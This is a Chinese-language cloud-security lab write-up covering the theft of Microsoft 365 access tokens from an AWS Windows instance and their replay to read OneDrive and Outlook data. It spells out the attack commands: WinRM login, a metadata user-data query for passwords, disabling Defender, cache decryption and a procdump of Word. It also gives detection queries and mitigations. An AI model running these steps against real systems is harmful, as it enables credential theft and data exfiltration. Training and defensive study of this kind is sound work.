# Learning Objective 12: 端点令牌窃取与数据渗漏

> 基于 Azure AD Attack & Defense Playbook 项目资料的优化版本
>
> 相关项目文件：[ReplayOfPrimaryRefreshToken.md](ReplayOfPrimaryRefreshToken.md), [AADCSyncServiceAccount.md](AADCSyncServiceAccount.md), [Adversary-in-the-Middle.md](Adversary-in-the-Middle.md)

---

## 目录

1. [实验概述](#1-实验概述)
2. [理论基础](#2-理论基础)
3. [实验条件与环境要求](#3-实验条件与环境要求)
4. [实验步骤详解](#4-实验步骤详解)
5. [检测与防御](#5-检测与防御)
6. [参考资料](#6-参考资料)

---

## 1. 实验概述

### 1.1 核心目标

本实验模拟**从云基础设施（IaaS）到云端应用（SaaS）的枢纽攻击场景**，主要包含以下三个阶段：

| 阶段 | 目标 | 技术手段 |
|------|------|----------|
| **Initial Access** | 使用 Objective 11 泄露的凭据登录 AWS EC2 实例 | PowerShell Remoting (WinRM) |
| **Credential Access** | 从运行中的 Office 进程提取 Access Token | DPAPI 解密 / 内存转储 |
| **Data Exfiltration** | 利用窃取的 Token 访问 OneDrive 和 Outlook | Microsoft Graph API |

### 1.2 攻击链示意图

```
[AWS EC2 实例]          [端点取证]              [SaaS 劫持]
     │                        │                       │
     ├─ WinRM 登录 ──────────>│                       │
     │                        │                       │
     ├─ 侦察 User Data ──────>│                       │
     │   (发现管理员密码)       │                       │
     │                        │                       │
     │                        ├─ 令牌提取 ───────────>│
     │                        │   (缓存解密/内存 Dump) │
     │                        │                       │
     │                        │                       ├─ OneDrive 访问
     │                        │                       ├─ Outlook 读取
     │                        │                       └─ 获取明文凭据
```

### 1.3 MITRE ATT&CK 映射

根据项目资料 [Adversary-in-the-Middle.md](Adversary-in-the-Middle.md#mitre-attck-framework) 和 [ReplayOfPrimaryRefreshToken.md](ReplayOfPrimaryRefreshToken.md#mitre-attck-framework)：

| 战术 | 技术 | 描述 |
|------|------|------|
| **Credential Access** | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) - OS Credential Dumping | 从内存中提取 DPAPI 保护的令牌 |
| **Credential Access** | [T1528](https://attack.mitre.org/techniques/T1528/) - Steal Application Access Token | 窃取应用访问令牌 |
| **Defense Evasion** | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) - Disable or Modify Tools | 禁用 Windows Defender 实时监控 |
| **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) - Data from Local System | 从端点收集令牌缓存数据 |

---

## 2. 理论基础

### 2.1 SSO 与令牌缓存机制

#### 2.1.1 为什么要缓存令牌？

**用户体验需求**：
- Microsoft 365 应用（Word、Excel、Outlook 等）需要频繁访问云资源
- 每次操作都要求用户重新输入密码会严重影响生产力
- Single Sign-On (SSO) 机制允许用户一次登录，处处访问

**技术实现**：
> 参考：[ReplayOfPrimaryRefreshToken.md - Token Lifetime](ReplayOfPrimaryRefreshToken.md#session-and-token-management-in-azure-ad)

```
┌─────────────────────────────────────────────────────────────┐
│                    令牌生命周期管理                          │
├─────────────────────────────────────────────────────────────┤
│ 令牌类型    │  有效期    │  用途                            │
├─────────────┼───────────┼─────────────────────────────────┤
│ PRT         │  14 天    │ 设备身份验证，颁发其他令牌        │
│ Refresh Token│ 90 天    │ 刷新 Access Token                │
│ Access Token│ 1 小时    │ 直接访问资源 (CAE: 20-28 小时)   │
└─────────────┴───────────┴─────────────────────────────────┘
```

#### 2.1.2 Token Broker 缓存架构

**存储位置**：
- **目录**：`%LOCALAPPDATA%\Microsoft\TokenBroker\Cache`
- **文件格式**：加密的二进制缓存文件 (`.decrypted` 后缀为解密后)

**安全机制**：
> 参考：[AADCSyncServiceAccount.md - DPAPI](AADCSyncServiceAccount.md#introduction)

```
┌──────────────────────────────────────────────────────────────┐
│                   DPAPI 保护机制                             │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│   [用户登录] ──> [DPAPI 主密钥生成] ──> [令牌加密存储]        │
│                     │                                        │
│                     ├─ 绑定到用户凭据                         │
│                     ├─ 可选：TPM 芯片保护                     │
│                     └─ 机器密钥参与                           │
│                                                              │
│   ⚠️ 只有相同用户上下文或管理员权限才能解密                    │
└──────────────────────────────────────────────────────────────┘
```

**DPAPI (Data Protection API) 工作原理**：

1. **密钥派生**：基于用户密码和机器 SID 派生主密钥
2. **分层保护**：
   - 用户级别：需要用户凭据
   - 机器级别：需要系统访问权限
   - 可选 TPM：硬件级别保护
3. **加密强度**：使用 AES-256 算法

### 2.2 Bearer Token 特性与风险

> 参考：[ReplayOfPrimaryRefreshToken.md - Access Token](ReplayOfPrimaryRefreshToken.md#access-token-at)

#### 2.2.1 "认票不认人" 原则

```
┌─────────────────────────────────────────────────────────────┐
│               OAuth 2.0 Bearer Token 特性                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGc...          │
│                                                              │
│   特点：                                                     │
│   ✓ 无需额外验证 ────> 令牌本身包含所有必要声明               │
│   ✓ 自包含状态 ────> 服务器无需维护会话状态                   │
│   ✓ 可移植性强 ────> 任何持有者都可使用                      │
│                                                              │
│   风险：                                                     │
│   ⚠️ 窃取即劫持 ────> 获取令牌即可冒充用户                    │
│   ⚠️ 无法即时撤销 ────> Access Token 在有效期内无法失效      │
│   ⚠️ 重放攻击 ────> 令牌可被多次使用                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### 2.2.2 令牌声明示例

```json
{
  "aud": "https://graph.microsoft.com",
  "iss": "https://sts.windows.net/{tenant-id}/",
  "scp": "Files.Read Mail.Read User.Read",
  "sub": "AAAAAAAAAAAA...user-identifier...",
  "exp": 1234567890,
  "nbf": 1234567890,
  "ver": "1.0"
}
```

**关键字段**：
- `scp` (Scope)：定义令牌可访问的权限范围
- `exp` (Expiration)：令牌过期时间戳
- `aud` (Audience)：目标资源标识符

### 2.3 内存中的令牌残留

> 参考：[AADCSyncServiceAccount.md - Memory Dump](AADCSyncServiceAccount.md#defender-for-endpoint-signals)

**原理**：
- 应用程序必须**在内存中解密**令牌才能使用
- 解密后的明文令牌会驻留在进程内存空间
- 即使磁盘上的缓存文件被 DPAPI 保护，内存中仍有明文副本

**内存残留时间**：
```
┌─────────────────────────────────────────────────────────────┐
│                    令牌内存生命周期                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   [令牌请求] ──> [解密到内存] ──> [使用] ──> [可能残留]       │
│                     │                                        │
│                     ├─ 进程运行期间：持续存在                 │
│                     ├─ 进程结束后：可能仍在未覆盖内存页        │
│                     └─ 内存转储：完整捕获                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. 实验条件与环境要求

### 3.1 前置条件说明

| 条件 | 要求 | 为什么需要？ |
|------|------|--------------|
| **AWS EC2 访问** | WinRM (5985/5986) 开放 | 远程执行命令的前提通道 |
| **有效凭据** | Objective 11 泄露的凭据 | 初始访问入口点 |
| **Office 进程运行** | Word/Outlook 进程活跃 | 令牌缓存存在的前提 |
| **管理员权限** | 本地 Administrator | DPAPI 解密需要高权限 |
| **工具可用** | TBRES.exe / Procdump.exe | 令牌提取的专用工具 |

### 3.2 为什么需要这些条件？

#### 3.2.1 Office 进程必须运行

**原因分析**：
> 参考：[Adversary-in-the-Middle.md - Token Replay](Adversary-in-the-Middle.md#token-replay-attacks)

```
┌─────────────────────────────────────────────────────────────┐
│               令牌缓存时序图                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   T0: 用户首次登录 Office                                   │
│       └──> PRT 获取                                        │
│       └──> Access Token 缓存                                │
│                                                              │
│   T1: 用户关闭 Office (Token 仍在缓存)                      │
│                                                              │
│   T2: 攻击者提取缓存令牌                                    │
│       └──> 成功窃取                                         │
│                                                              │
│   ⚠️ 如果 Office 从未运行，缓存目录不存在或为空              │
└─────────────────────────────────────────────────────────────┘
```

**验证方法**：
```powershell
# 检查 Office 进程
Get-Process -Name WINWORD, OUTLOOK -ErrorAction SilentlyContinue

# 检查缓存目录
Test-Path "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache"
```

#### 3.2.2 管理员权限的必要性

**DPAPI 解密要求**：
> 参考：[AADCSyncServiceAccount.md - DPAPI Credentials](AADCSyncServiceAccount.md#attack-scenarios)

```
┌─────────────────────────────────────────────────────────────┐
│              DPAPI 权限要求分析                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   场景 1: 普通用户权限                                      │
│   ────────────────────                                      │
│   ✗ 无法访问其他用户进程                                    │
│   ✗ 无法读取受 DPAPI 保护的缓存                             │
│   ✓ 仅能解密自己的令牌 (如果以该用户运行)                    │
│                                                              │
│   场景 2: 本地管理员权限                                    │
│   ────────────────────                                      │
│   ✓ 可以访问所有用户进程                                    │
│   ✓ 可以读取受 DPAPI 保护的缓存                             │
│   ✓ 可以使用 Runas 进行权限提升                             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### 3.2.3 WinRM 通道

**协议说明**：
- **端口**：5985 (HTTP) / 5986 (HTTPS)
- **用途**：远程 PowerShell 会话管理
- **认证**：基本认证 / NTLM / Kerberos

**连接验证**：
```powershell
# 测试 WinRM 连接
Test-WSMan -ComputerName <目标IP> -Port 5986
```

### 3.3 环境变量与配置

**关键环境变量**：
```powershell
# 令牌缓存路径
$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache

# AWS 元数据服务
http://169.254.169.254/latest/user-data

# Office 进程内存位置
WINWORD.exe (进程空间)
```

---

## 4. 实验步骤详解

### 4.1 步骤 1: 建立连接与侦察

#### 4.1.1 连接目标 EC2 实例

**操作步骤**：

```powershell
# 1. 创建凭据对象
$securePassword = ConvertTo-SecureString "Objective11泄露的密码" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('ASbiulag4854', $securePassword)

# 2. 测试 WinRM 连接
Test-WSMan -ComputerName 3.208.47.144

# 3. 建立 PowerShell 会话
$ec2instance = New-PSSession -ComputerName 3.208.47.144 -Credential $creds -UseSSL

# 4. 进入远程会话
Enter-PSSession $ec2instance
```

**为什么使用 WinRM？**
- Windows 远程管理的标准协议
- 支持双向身份验证
- 允许执行复杂 PowerShell 命令
- 比 RDP 更轻量，更适合脚本化操作

#### 4.1.2 AWS 元数据侦察

**操作步骤**：

```powershell
# 请求 User Data (可能包含初始化脚本)
Invoke-RestMethod -Uri "http://169.254.169.254/latest/user-data" | Select-Object -ExpandProperty RawContent
```

**预期发现**：
```
<powershell>
# ... 初始化脚本 ...
$adminPassword = "%dlTKmropc..."
# ... 其他配置 ...
</powershell>
```

**为什么查询元数据服务？**
> 参考：[AADCSyncServiceAccount.md - AWS Metadata](AADCSyncServiceAccount.md)

- EC2 实例的 User Data 常包含初始化配置
- 可能包含**明文凭据**或**敏感脚本**
- 本地管理员密码是 DPAPI 解密的关键

### 4.2 步骤 2: 令牌提取 - 方法 A (DPAPI 解密)

> 参考：[AADCSyncServiceAccount.md - AADInternals](AADCSyncServiceAccount.md#dumping-credentials-with-aadinternals)

#### 4.2.1 工具准备

**上传 TBRES.exe 到目标**：

```powershell
# 从本地复制工具到远程会话
Copy-Item -ToSession $ec2instance -Path "C:\AzAD\Tools\TBRES.exe" -Destination "C:\Windows\Temp\"
```

**TBRES 工具说明**：
- **全称**：Token Broker Cache Decryptor
- **功能**：解密 Microsoft Token Broker 缓存
- **原理**：利用 DPAPI 接口解密 `.cache` 文件

#### 4.2.2 执行解密

**为什么需要管理员权限？**

```
┌─────────────────────────────────────────────────────────────┐
│           令牌缓存的权限模型                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   [Word 进程] ──> 运行于管理员上下文 ──> 令牌被加密存储       │
│                     │                                        │
│                     └─── DPAPI 使用管理员密钥加密             │
│                                                              │
│   攻击者需要：                                              │
│   1. 管理员权限 ────> 才能访问加密上下文                     │
│   2. Invoke-RunasCs ────> 提权到目标用户                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**操作步骤**：

```powershell
# 使用从 User Data 获取的管理员密码
$adminCreds = New-Object System.Management.Automation.PSCredential('administrator', (ConvertTo-SecureString "%dlTKmropc..." -AsPlainText -Force))

# 以管理员身份运行 TBRES
Invoke-RunasCs -Username administrator -Password "%dlTKmropc..." -Command "C:\Windows\Temp\TBRES.exe"
```

**预期输出**：
```
Token Broker Cache Decryptor v1.0
=====================================
[+] Found 2 cache files
[+] Decrypting: CacheFile1.cache -> CacheFile1.decrypted
[+] Decrypting: CacheFile2.cache -> CacheFile2.decrypted
[+] Done!
```

#### 4.2.3 提取 Access Token

**搜索 JWT 格式令牌**：

```powershell
# 在解密文件中搜索 JWT 特征
Get-Content "C:\Windows\Temp\*.decrypted" | Select-String "eyJ0eXAiOi"
```

**JWT 识别特征**：
- **Header**: `eyJ0eXAiOiJKV1QiLCJhbGc...` (Base64 编码)
- **格式**: `header.payload.signature`
- **验证**: 使用 jwt.io 解码查看权限范围

### 4.3 步骤 3: 令牌提取 - 方法 B (内存转储)

> 参考：[ReplayOfPrimaryRefreshToken.md - Memory Dump](ReplayOfPrimaryRefreshToken.md#provisioning-a-new-device-to-extract-unprotected-prt-keys)

#### 4.3.1 禁用 Windows Defender

**为什么必须禁用？**
> 参考：[AADCSyncServiceAccount.md - MDE Detection](AADCSyncServiceAccount.md#defender-for-endpoint-signals)

```
┌─────────────────────────────────────────────────────────────┐
│          Windows Defender 对进程转储的检测                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   检测规则：                                                 │
│   ────────────                                              │
│   ✓ Procdump.exe 被标记为"凭据窃取工具"                      │
│   ✓ LSASS 访问尝试会触发告警                                 │
│   ✓ 内存转储行为模式识别                                     │
│                                                              │
│   应对措施：                                                 │
│   ────────────                                              │
│   Set-MpPreference -DisableRealtimeMonitoring $true          │
│   Set-MpPreference -DisableIOAVProtection $true              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**操作步骤**：

```powershell
# 临时禁用实时监控
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
```

**安全提示**：生产环境中此操作会被记录审计

#### 4.3.2 执行内存转储

**工具选择 - Procdump.exe**：
- **来源**：Microsoft Sysinternals Suite
- **用途**：进程内存转储工具
- **优势**：合法的管理工具，误报率相对较低

**操作步骤**：

```powershell
# 1. 查找 WINWORD 进程
$winword = Get-Process -Name WINWORD
Write-Host "WINWORD PID: $($winword.Id)"

# 2. 执行内存转储
# -ma: 完整内存转储
# -o: 输出目录
procdump.exe -ma $winword.Id "C:\Windows\Temp\WINWORD.dmp"
```

**转储选项说明**：
| 参数 | 说明 |
|------|------|
| `-ma` | 完整内存转储 (包含所有内存页) |
| `-mp` | Mini 转储 (更快，但可能遗漏数据) |
| `-o` | 指定输出目录 |

#### 4.3.3 提取字符串

**下载到本地分析**：

```powershell
# 从远程会话复制到本地
Copy-Item -FromSession $ec2instance -Path "C:\Windows\Temp\WINWORD.dmp" -Destination "C:\Analysis\"
```

**使用 Strings.exe 提取**：

```powershell
# 在本地执行
strings.exe "C:\Analysis\WINWORD.dmp" | findstr /i "eyJ0eX"
```

**为什么使用 Strings 工具？**
- 从二进制文件中提取可打印 ASCII/Unicode 字符串
- JWT 是 Base64 编码的文本，会被提取出来
- 快速扫描大文件的有效方法

### 4.4 步骤 4: 数据渗漏

> 参考：[Adversary-in-the-Middle.md - Token Replay](Adversary-in-the-Middle.md#token-replay-attacks)

#### 4.4.1 令牌验证

**解码 JWT 查看权限**：

```bash
# 使用 jwt.io 或 PowerShell 解码
# Header: {"alg":"RS256","typ":"JWT","xms_tt":{"code":"true"}...}
# Payload: {"scp":"Files.Read Mail.Read User.Read"...}
```

**关键声明检查**：
| 声明 | 值 | 含义 |
|------|-----|------|
| `scp` | `Files.Read` | OneDrive 读取权限 |
| `scp` | `Mail.Read` | Outlook 邮件读取权限 |
| `aud` | `https://graph.microsoft.com` | Microsoft Graph API |
| `exp` | 时间戳 | 令牌过期时间 |

#### 4.4.2 访问 OneDrive

**Graph API 调用**：

```powershell
# 设置变量
$Token = "eyJ0eXAiOi..." # 窃取的 Access Token
$Headers = @{
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

# 列出 OneDrive 根目录文件
$URI = "https://graph.microsoft.com/v1.0/me/drive/root/children"
$Response = Invoke-RestMethod -Uri $URI -Headers $Headers -Method Get

# 显示文件列表
$Response.value | Select-Object Name, Size, WebUrl
```

**API 端点说明**：
```
GET /me/drive/root/children
├──> 返回 OneDrive 根目录的子项
├──> 需要 Files.Read 权限
└──> 返回 JSON 格式文件列表
```

**下载文件**：

```powershell
# 下载特定文件
$DownloadUrl = "https://graph.microsoft.com/v1.0/me/drive/items/{item-id}/content"
Invoke-RestMethod -Uri $DownloadUrl -Headers $Headers -Method Get -OutFile "C:\Data\accessingplantinfo.ps1"
```

#### 4.4.3 访问 Outlook 邮件

**使用 MgGraph PowerShell 模块**：

```powershell
# 使用窃取的令牌连接
Connect-MgGraph -AccessToken $Token

# 读取邮件
$Messages = Get-MgUserMessage -UserId "CaseyRSawyer@domain.com" -Top 10

# 显示邮件主题
$Messages | Select-Object Subject, ReceivedDateTime
```

**读取邮件正文**：

```powershell
# 获取特定邮件内容
$MessageId = "AAAAAAAA..."
$Message = Get-MgUserMessage -UserId "CaseyRSawyer@domain.com" -MessageId $MessageId

# 提取正文
$Body = Get-MgUserMessageBody -UserId "CaseyRSawyer@domain.com" -MessageId $MessageId
$Body.Content
```

### 4.5 步骤 5: 凭据提取

**从文件/邮件中提取明文密码**：

```powershell
# 搜索文件内容
Select-String -Path "C:\Data\accessingplantinfo.ps1" -Pattern "password|Password|pwd"

# 可能发现：
# $adminPassword = "ZccK4FggDmnT4HY5"
```

**获取的新凭据**：
- **用途**：后续横向移动
- **目标**：内网其他系统
- **来源**：OneDrive 文件或 Outlook 邮件

---

## 5. 检测与防御

### 5.1 检测方法

> 参考：[AADCSyncServiceAccount.md - Detections](AADCSyncServiceAccount.md#detections)
> 参考：[Adversary-in-the-Middle.md - Detection](Adversary-in-the-Middle.md#detections)

#### 5.1.1 端点检测 (Microsoft Defender for Endpoint)

**检测信号**：

```
┌─────────────────────────────────────────────────────────────┐
│           MDE 对令牌窃取的检测                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   1. PRT 访问尝试                                           │
│      ────> "Possible attempt to access Primary Refresh Token"│
│      ────> 触发条件：直接操作 PRT                            │
│      ────> 置信度：高                                       │
│                                                              │
│   2. 凭据转储工具                                           │
│      ────> AADInternals 检测                                │
│      ────> Procdump 异常使用                                │
│      ────> Mimikatz 行为模式                                │
│                                                              │
│   3. 禁用 Defender 操作                                     │
│      ────> Set-MpPreference 调用                            │
│      ────> 实时监控关闭                                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**KQL 检测查询**：

```kusto
// 检测 PRT 访问尝试
DeviceProcessEvents
| where FileName in ("AADInternals.dll", "TBRES.exe")
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

#### 5.1.2 身份检测 (Entra ID Protection)

**检测规则**：

> 参考：[ReplayOfPrimaryRefreshToken.md - Identity Protection](ReplayOfPrimaryRefreshToken.md#azure-ad-identity-protection-ipc)

| 检测名称 | 描述 | 置信度 |
|---------|------|--------|
| Anomalous Token | 令牌生命周期异常，从陌生位置重放 | 高 |
| Unfamiliar Sign-in Properties | 位置、应用、IP、User Agent 异常 | 中 |
| Attacker in the Middle | 关联恶意反向代理的认证会话 | 高 |

**配置条件访问**：

```powershell
# 配置高风险用户策略
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

# 要求每次登录时重新认证
$CaPolicy = @{
    DisplayName = "High Risk User - Re-authenticate"
    Conditions = @{
        RiskLevels = @("high")
        SignInRiskLevels = @("high")
    }
    GrantControls = @{
        Operator = "OR"
        BuiltInControls = @("mfa")
    }
    SessionControls = @{
        SignInFrequency = @{
            Value = 1
            Type = "hours"
            IsEnabled = $true
        }
    }
}
```

#### 5.1.3 云应用检测 (Microsoft Defender for Cloud Apps)

**会话行为分析**：

```
┌─────────────────────────────────────────────────────────────┐
│           MDA Behaviors 数据层                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   行为类型              │ TTP 映射                          │
│   ─────────────────────┼────────────────────────────────    │
│   不可能旅行            │ T1078 - Valid Accounts            │
│   异常文件下载          │ T1030 - Data Transfer              │
│   收件箱规则操纵        │ T1114.003 - Email Rules            │
│   敏感 Graph API 调用   │ T1528 - Steal App Access Token     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**会话关联查询**：

```kusto
// 关联风险会话与敏感 Exchange Online 活动
let SensitiveEvents = dynamic([
    'New-InboxRule', 'Set-InboxRule', 'HardDelete', 'AnonymousLinkCreated'
]);

CloudAppEvents
| where ActionType in~ (SensitiveEvents)
| extend SessionId = tostring(RawEventData.SessionId)
| where isnotempty(SessionId)
| project Timestamp, AccountName, ActionType, SessionId, IPAddress
| join kind=inner (
    SigninLogs
    | where RiskLevelDuringSignIn == "high"
    | project SessionId, RiskDetail
) on SessionId
```

### 5.2 缓解措施

#### 5.2.1 TPM 保护强制

> 参考：[ReplayOfPrimaryRefreshToken.md - TPM Protection](ReplayOfPrimaryRefreshToken.md#mitigations)

**配置要求**：

```
┌─────────────────────────────────────────────────────────────┐
│           TPM 保护策略                                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   设备合规性策略：                                          │
│   ─────────────────                                          │
│   ✓ 要求 TPM 2.0+                                          │
│   ✓ 启用 Secure Boot                                       │
│   ✓ 启用 BitLocker                                         │
│   ✓ 禁用 Grace Period                                      │
│                                                              │
│   Windows Hello for Business 策略：                         │
│   ────────────────────────────────                         │
│   ✓ 强制 TPM 保护                                          │
│   ✓ 阻止用户查看恢复密钥                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Intune 配置**：

```xml
<!-- Device Health Attestation -->
<Policy>
  <RequireTPM>true</RequireTPM>
  <RequireSecureBoot>true</RequireSecureBoot>
  <RequireBitLocker>true</RequireBitLocker>
  <GracePeriod>0</GracePeriod>
</Policy>
```

#### 5.2.2 条件访问优化

**推荐策略**：

> 参考：[Adversary-in-the-Middle.md - Conditional Access](Adversary-in-the-Middle.md#mitigations-and-reduced-attack-surface)

```powershell
# 1. 设备合规性要求
$CompliantDevicePolicy = @{
    DisplayName = "Require Compliant Device - SaaS Apps"
    Conditions = @{
        Applications = @{
            IncludeApplications = @("00000003-0000-0000-c000-000000000000") # Microsoft Graph
        }
    }
    GrantControls = @{
        BuiltInControls = @("compliantDevice")
    }
}

# 2. 签入频率控制
$SignInFrequency = @{
    DisplayName = "Sign-in Frequency - All Apps"
    SessionControls = @{
        SignInFrequency = @{
            Value = 1
            Type = "hours"
            IsEnabled = $true
        }
    }
}
```

#### 5.2.3 端点保护

**ASR 规则配置**：

```powershell
# 攻击面减少规则
$ASRRules = @{
    "Block credential stealing from the Windows local security authority subsystem" = "Enable"
    "Block process creations originating from PSExec and WMI" = "Enable"
}
```

**MDE 自动化响应**：

```powershell
# 配置自动调查级别
Set-MpPreference -AttackSurface_reductionRules_Ids "..."
```

---

## 6. 参考资料

### 6.1 项目文档引用

| 主题 | 文件位置 | 关键章节 |
|------|----------|----------|
| **PRT 重放攻击** | [ReplayOfPrimaryRefreshToken.md](ReplayOfPrimaryRefreshToken.md) | Attack Scenarios, Detections, Mitigations |
| **DPAPI 凭据保护** | [AADCSyncServiceAccount.md](AADCSyncServiceAccount.md) | Attack Scenarios, MDE Detections |
| **AiTM 令牌劫持** | [Adversary-in-the-Middle.md](Adversary-in-the-Middle.md) | Token Replay, Detection Methods |
| **MITRE ATT&CK 映射** | [README.md](README.md#mitre-attck-framework) | TTP Mapping |

### 6.2 Microsoft 官方文档

| 主题 | URL |
|------|-----|
| **Windows DPAPI** | https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10) |
| **Primary Refresh Token** | https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token |
| **Microsoft Graph API** | https://learn.microsoft.com/en-us/graph/use-the-api |
| **条件访问策略** | https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview |
| **AWS 元数据服务** | https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html |

### 6.3 社区研究

| 标题 | 作者/来源 |
|------|-----------|
| Abusing Azure AD SSO with PRT | Dirk-jan Mollema |
| Shooting Up: On-Prem to Cloud | imp hash |
| Azure AD Connect for Red Teamers | XPN InfoSec |
| TokenTactics V2 | Fabian Bader |

### 6.4 检测查询仓库

- **Microsoft Sentinel 规则模板**：`queries/` 目录
- **KQL 函数**：`queries/AiTM/Functions/`
- **检测规则 JSON**：`queries/*.json`

---

## 附录：快速参考

### A. 常用 PowerShell 命令

```powershell
# WinRM 连接测试
Test-WSMan -ComputerName <IP> -Port 5986

# 进程查找
Get-Process -Name WINWORD,OUTLOOK

# 缓存目录检查
Test-Path "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache"

# Defender 状态查询
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# JWT 解码 (使用 System.IdentityModel.Tokens.Jwt)
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("payload"))
```

### B. 关键文件位置

```
令牌缓存:
%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\

AADInternals 日志:
%TEMP%\AADInternals\

Procdump 输出:
C:\Windows\Temp\*.dmp
```

### C. 应急响应检查清单

- [ ] 检查 MDE 是否检测到 PRT 访问
- [ ] 审查 Entra ID Protection 用户风险
- [ ] 检查可疑会话 ID 的活动
- [ ] 验证 OneDrive/Outlook 异常访问
- [ ] 撤销受影响用户的刷新令牌
- [ ] 重置泄露的凭据

---

**文档版本**：v2.0 (基于 Azure AD Attack & Defense Playbook 项目优化)
**最后更新**：2025-01
**许可**：遵循项目原许可证
